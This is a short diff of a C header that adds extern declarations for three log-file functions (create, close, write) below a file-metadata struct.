@@ -43,3 +43,8 @@ typedef struct _FileAdditionalData {
 		#define LOG_FILE_VERSION 2008122901
 	UINT uFileNameLen;
 } FileAdditionalData, *pFileAdditionalData;
+
+//add by fhc
+extern HANDLE Log_CreateFile2(DWORD, BYTE *, DWORD,BOOL);
+extern void Log_CloseFile2(HANDLE);
+extern BOOL Log_WriteFile2(HANDLE, BYTE *, DWORD);
